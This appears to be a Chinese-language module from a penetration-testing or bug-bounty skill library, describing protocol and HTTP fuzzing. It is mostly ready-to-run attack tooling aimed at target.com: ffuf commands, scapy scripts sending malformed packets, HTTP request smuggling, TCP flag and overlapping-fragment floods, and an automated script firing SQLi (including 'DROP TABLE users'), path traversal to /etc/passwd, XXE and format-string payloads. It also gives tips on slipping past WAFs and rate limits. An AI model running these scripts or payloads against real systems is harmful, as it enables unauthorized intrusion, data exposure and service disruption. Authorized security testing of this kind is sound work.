# 协议模糊测试模块 (Protocol Fuzzer)

> 环境：ffuf✅ scapy✅ python3✅ tcpdump✅ strace✅
> 目标：发现协议实现中的未知漏洞 — 缓冲区溢出、格式错误处理、状态机缺陷

---

## 知识锚点（Playbook + H1 案例）

> 模糊测试的产出是崩溃/异常，落地的漏洞类型需映射到 playbook 才能形成完整报告。

### 关联 Playbook

- `references/playbooks/dos.md` — 模糊测试触发的崩溃、资源耗尽、服务挂起走 DoS playbook 评估可用性影响
- `references/playbooks/rce/00-index.md` — 格式字符串、缓冲区溢出等可能升级为命令注入/RCE
- `references/playbooks/info-disclosure.md` — 异常响应中泄露的堆栈、内存、调试信息走信息泄露 playbook

### 关联 H1 案例（references/h1-reports/by-weakness/）

- `buffer-overflow.md` — 超长字段触发的栈/堆溢出
- `integer-overflow.md` — 整数回绕导致的长度校验绕过
- `off-by-one-error.md` — 边界差一导致的越界读写
- `null-pointer-dereference.md` — 空指针解引用导致的崩溃

### Payload / 工具

- 整数边界 / 格式字符串 / 路径遍历 / Unicode 混淆 payload：已内联于下方自动化脚本模板的 `payloads` 列表，直接执行
- 工具链：ffuf（HTTP 参数模糊）→ scapy（协议层构造）→ python3（变异引擎）→ strace（崩溃检测）→ tshark（流量分析）
- Web 注入 payload：`payloads/web/sqli-payloads.md`、`payloads/web/xss-payloads.md`

## 底层原理：模糊测试不是"随机发数据"，是"系统性破坏协议假设"

```
协议的每一层都建立在"对方会遵守规则"的假设上。
模糊测试 = 故意违反这些假设，观察对方是否崩溃/异常。

核心破坏维度：
1. 长度破坏：超长字段、负数长度、零长度、长度与实际不符
2. 类型破坏：字符串→二进制、整数→浮点、预期格式→随机字节
3. 边界破坏：溢出、下溢、符号翻转、整数回绕
4. 状态破坏：乱序消息、跳过状态、重复状态、并发竞争
5. 编码破坏：Unicode混淆、NULL字节注入、换行注入、转义未转义
```

### 模糊测试决策树

```
目标是什么？
├── Web API/HTTP 端点
│   ├── 有文档(Swagger/OpenAPI) → 按参数类型生成变异
│   ├── 无文档 → 先爬取收集参数，再模糊
│   └── 特殊：GraphQL → 内省查询获取schema → 按字段类型变异
├── TCP/UDP 协议
│   ├── 已知协议(HTTP/DNS/SMTP) → 协议模板变异
│   └── 未知协议 → 抓包分析格式 → 逐字段变异
├── 文件格式
│   ├── 图片/文档/压缩包 → 文件头+数据块变异
│   └── 配置文件(JSON/YAML/XML) → 结构变异
└── 二进制输入
    └── 命令行参数/环境变量 → 超长/格式字符串/特殊字符
```

---

## HTTP 模糊测试（最常用）

### 1. 参数发现 → 参数模糊

```bash
# 第一步：收集所有参数
# 用浏览器引擎抓取页面 + JS 源码，提取 <form>/AJAX/API 端点
# 用爬虫收集参数：
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 404

# 第二步：参数爆破
# 假设发现 https://target.com/api/user?id=123
# 用 ffuf 模糊 id 参数
ffuf -u "https://target.com/api/user?id=FUZZ" \
  -w fuzz_payloads.txt \
  -fc 400,404 \
  -mr "error|exception|SQL|syntax|traceback|stack" \
  -t 50

# 第三步：针对每个参数，按类型生成变异
# 整数参数变异：
# 0, -1, 2147483647, -2147483648, 9999999999999, 0xDEADBEEF, NaN, Infinity
# 字符串参数变异：
# "" (空), %s%s%s%s%s (格式字符串), ../../../etc/passwd (路径遍历),
# <script>alert(1)</script> (XSS), ' OR '1'='1 (SQLi),
# ${7*7} (SSTI), {{7*7}} (SSTI Jinja2), ${{7*7}} (SSTI)
```

### 2. HTTP 协议层模糊

```bash
# 用 scapy 构造畸形 HTTP 请求
python3 << 'EOF'
from scapy.all import *

# 1. 超长 URI
payload = IP(dst="target.com")/TCP(dport=80)/Raw(
    b"GET /" + b"A" * 5000 + b" HTTP/1.1\r\nHost: target.com\r\n\r\n"
)
send(payload)

# 2. 负数 Content-Length
payload = IP(dst="target.com")/TCP(dport=80)/Raw(
    b"POST /api HTTP/1.1\r\nHost: target.com\r\nContent-Length: -1\r\n\r\n"
)
send(payload)

# 3. Content-Length 与实际不符
payload = IP(dst="target.com")/TCP(dport=80)/Raw(
    b"POST /api HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\n\r\n" + b"A" * 1000
)
send(payload)

# 4. 畸形 Header
payload = IP(dst="target.com")/TCP(dport=80)/Raw(
    b"GET / HTTP/1.1\r\nHost: target.com\r\n" + b"\x00" * 100 + b": value\r\n\r\n"
)
send(payload)

# 5. HTTP 请求走私
# CL.TE: Content-Length + Transfer-Encoding 冲突
payload = IP(dst="target.com")/TCP(dport=80)/Raw(
    b"POST / HTTP/1.1\r\nHost: target.com\r\n"
    b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
    b"0\r\n\r\nG"
)
send(payload)
EOF
```

### 3. 响应监控

```bash
# 模糊测试的核心：你必须知道对方是否崩溃了
# 1. HTTP 状态码监控
while true; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "https://target.com")
  echo "$(date): $code"
  if [ "$code" = "000" ] || [ "$code" -ge 500 ]; then
    echo "!! 异常状态码: $code"
    notify-send "Fuzzer" "异常: $code"  # 或记录到文件
  fi
  sleep 1
done

# 2. 响应时间突变检测（可能触发了超时/WAF）
curl -w "time_total: %{time_total}\n" -o /dev/null -s "https://target.com/api?id=1"
curl -w "time_total: %{time_total}\n" -o /dev/null -s "https://target.com/api?id=9999999999"
# 如果后者耗时显著增加，可能触发了慢查询或死循环

# 3. 响应体差异检测
curl -s "https://target.com/api?id=1" | md5sum
curl -s "https://target.com/api?id=FUZZ_PAYLOAD" | md5sum
# 不同的 MD5 = 不同的响应，可能是错误信息泄露
```

---

## TCP 协议模糊测试

### 用 scapy 构造任意 TCP 包

```python
# 本机 scapy 2.7.0 ✅

from scapy.all import *

# === 1. TCP 标志位组合 ===
# SYN+ACK+FIN 同时设置（非法组合）
for flags in range(0, 256):
    pkt = IP(dst="target.com")/TCP(dport=80, flags=flags)
    send(pkt, verbose=0)

# === 2. TCP 选项模糊 ===
# 超长选项
pkt = IP(dst="target.com")/TCP(dport=80, options=[('MSS', 0)]*100)
send(pkt)
# 格式错误选项
pkt = IP(dst="target.com")/TCP(dport=80, options=[(0xff, b'\x00'*100)])
send(pkt)

# === 3. 序列号攻击 ===
# seq=0, ack=0
pkt = IP(dst="target.com")/TCP(dport=80, seq=0, ack=0, flags="PA")/Raw(b"GET / HTTP/1.0\r\n\r\n")
send(pkt)
# 超长 seq
pkt = IP(dst="target.com")/TCP(dport=80, seq=2**32-1, flags="S")
send(pkt)

# === 4. 分片攻击 ===
# 重叠分片
frag1 = IP(dst="target.com", id=12345, frag=0, flags="MF")/ICMP(b'A'*8)
frag2 = IP(dst="target.com", id=12345, frag=1, flags=0)/ICMP(b'B'*8)
frag3 = IP(dst="target.com", id=12345, frag=1, flags=0)/ICMP(b'C'*8)  # 重叠
send([frag1, frag2, frag3])
```

---

## 文件格式模糊测试

```bash
# 1. 图片格式模糊
# 生成一个正常的 PNG，然后逐字节变异
python3 << 'EOF'
import random

with open('test.png', 'rb') as f:
    data = bytearray(f.read())

# 变异策略：随机翻转字节
for i in range(100):
    mutated = data.copy()
    for _ in range(random.randint(1, 10)):
        pos = random.randint(0, len(mutated) - 1)
        mutated[pos] = random.randint(0, 255)
    with open(f'mutated_{i}.png', 'wb') as f:
        f.write(mutated)

# 变异策略：超长字段
# 在 PNG 的 IHDR 块中插入超长数据
EOF

# 2. JSON/XML 结构模糊
# 嵌套深度攻击
python3 -c "
import json
# 深层嵌套（可能触发栈溢出）
d = {}
cur = d
for i in range(10000):
    cur['nested'] = {}
    cur = cur['nested']
print(json.dumps(d)[:5000])
"

# 3. 上传模糊测试
# 用 curl 上传畸形文件到目标
curl -X POST https://target.com/upload \
  -F "file=@mutated_0.png;type=image/png" \
  -w "\nHTTP: %{http_code}\nTime: %{time_total}s\n"
```

---

## 崩溃检测与分类

```bash
# 1. 用 strace 监控目标进程
strace -f -e trace=signal -p $(pgrep -f target_binary) 2>&1 | tee strace.log
# 看到 SIGSEGV/SIGABRT/SIGBUS 就是崩溃

# 2. 用 tcpdump 抓包分析
tcpdump -i any host target.com -w fuzz.pcap
# 事后用 tshark 分析
tshark -r fuzz.pcap -Y "tcp.flags.reset==1"  # 找 RST 包（可能崩溃）
tshark -r fuzz.pcap -T fields -e frame.time -e ip.src -e tcp.srcport

# 3. 崩溃复现
# 复现条件：记录触发崩溃的精确 payload
# 保存到 crash_cases/ 目录，包含：
#   - payload 原文
#   - 崩溃时的寄存器状态
#   - 崩溃时的调用栈
#   - 复现步骤
```

---

## 自动化模糊测试流程

```bash
# 完整自动化脚本模板
python3 << 'PYEOF'
import subprocess, time, json, os

target = "https://target.com/api/user"
param = "id"
payloads = [
    # 整数溢出
    "0", "-1", "2147483647", "-2147483648", "9999999999999",
    # SQL 注入
    "'", "\"", "1' OR '1'='1", "1; DROP TABLE users--",
    # 格式字符串
    "%s%s%s%s%s", "%x%x%x%x%x", "%n%n%n%n%n",
    # 路径遍历
    "../../../etc/passwd", "....//....//....//etc/passwd",
    # 特殊字符
    "\x00", "\x00admin", "%00", "\r\n", "\n\n\n",
    # JSON/XML 注入
    '{"$gt": ""}', "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
    # Unicode
    "\u0000", "\uffff", "Ａ" * 1000,  # 全角字符
]

results = []
for p in payloads:
    url = f"{target}?{param}={p}"
    start = time.time()
    try:
        r = subprocess.run(
            ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}|%{size_download}|%{time_total}',
             '-m', '10', url],
            capture_output=True, text=True, timeout=15
        )
        code, size, elapsed = r.stdout.strip().split('|')
    except:
        code, size, elapsed = 'TIMEOUT', '0', '10'
    
    results.append({
        'payload': p,
        'code': code,
        'size': size,
        'time': round(time.time() - start, 3)
    })
    print(f"{p[:30]:<30} → HTTP {code}  size={size}  time={elapsed}s")

# 异常检测
print("\n=== 异常结果 ===")
for r in results:
    if r['code'] == '000' or r['code'] == 'TIMEOUT':
        print(f"!! 崩溃: {r['payload']}")
    elif int(r['code']) >= 500:
        print(f"!! 500错误: {r['payload']}")
    elif r['size'] == '0':
        print(f"?? 空响应: {r['payload']}")
PYEOF
```

---

## 本机环境速查

```
已安装: ffuf✅ scapy 2.7.0✅ python3✅ tcpdump✅ tshark✅ strace✅ curl✅
缺失:   AFL++ (需编译) / boofuzz (pip超时) / radamsa (需编译) / syzkaller (需内核)
替代:   scapy + ffuf + python3 自制脚本覆盖大部分模糊需求
        AFL++ 可通过 apt install afl++ 尝试安装（ARM64 兼容性待验证）

proot 限制: 部分内核模糊(syscall/ioctl)需直接在内核空间测试，proot 不支持
            但用户态协议模糊和文件格式模糊完全不受影响
```

---

## 反爬钩子

> 模糊测试的反爬特征取决于目标协议类型，需区分协议层和 Web 层。

- **协议模糊测试不涉及 Web 反爬**：TCP/UDP/文件格式的模糊测试直接发送原始包，没有 WAF/验证码概念
- **HTTP 模糊测试可能触发 WAF**：ffuf 高并发请求、超长 URI、畸形 Header 容易被 Cloudflare/ModSecurity 拦截或限速
- **响应监控可能被反爬干扰**：用 curl 高频探测响应码/响应时间时，可能触发速率限制导致误判为崩溃
- **应对策略**：详见 `references/methodology/06-anti-antibot.md`，协议层保持原节奏，HTTP 层降速并发并使用合法 User-Agent

## 经验回写

每次模糊测试任务完成后，记录：
- 目标类型和协议
- 发现的异常（崩溃/超时/错误码）
- 复现步骤和 payload
- 使用的变异策略和效果